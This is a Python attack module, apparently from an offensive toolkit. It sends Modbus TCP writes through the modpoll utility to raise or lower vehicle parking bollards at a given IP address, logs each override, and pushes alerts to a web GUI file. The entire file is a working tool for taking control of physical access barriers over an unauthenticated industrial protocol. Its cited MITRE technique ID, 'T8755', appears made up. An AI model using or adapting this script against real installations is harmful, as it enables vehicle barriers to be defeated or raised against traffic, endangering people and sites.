#!/usr/bin/env python3
# modules/attacks/parking_bollard_override.py

import argparse
import json
import subprocess
import time
import os
from datetime import datetime

LOG = "results/bollard_override.log"
ALERT = "webgui/alerts.json"
MITRE_TTP = "T8755"

def log_event(message):
    os.makedirs("results", exist_ok=True)
    with open(LOG, "a") as f:
        f.write(f"{datetime.utcnow().isoformat()} | {message}\n")
    print(f"[BOLLARD] {message}")

def push_alert(msg):
    os.makedirs("webgui", exist_ok=True)
    alert = {
        "agent": "parking_bollard_override",
        "message": msg,
        "type": "physical",
        "timestamp": time.time()
    }
    with open(ALERT, "a") as f:
        f.write(json.dumps(alert) + "\n")

def send_modbus_command(action, ip, unit):
    register = "0x0010"
    value = "1" if action == "lower" else "0"
    cmd = f"modpoll -m tcp -t 0 -r {register} -p 502 -a {unit} -1 -c 1 {ip} -v {value}"
    try:
        subprocess.run(cmd.split(), check=True)
        msg = f"Bollard command '{action}' sent to {ip}"
        log_event(msg)
        push_alert(msg)
    except Exception as e:
        log_event(f"[!] Failed to send Modbus command: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Override vehicle bollards via Modbus TCP")
    parser.add_argument("--action", required=True, choices=["raise", "lower"])
    parser.add_argument("--ip", required=True, help="Bollard Modbus IP")
    parser.add_argument("--unit", default="1", help="Modbus unit ID")
    args = parser.parse_args()
    send_modbus_command(args.action, args.ip, args.unit)
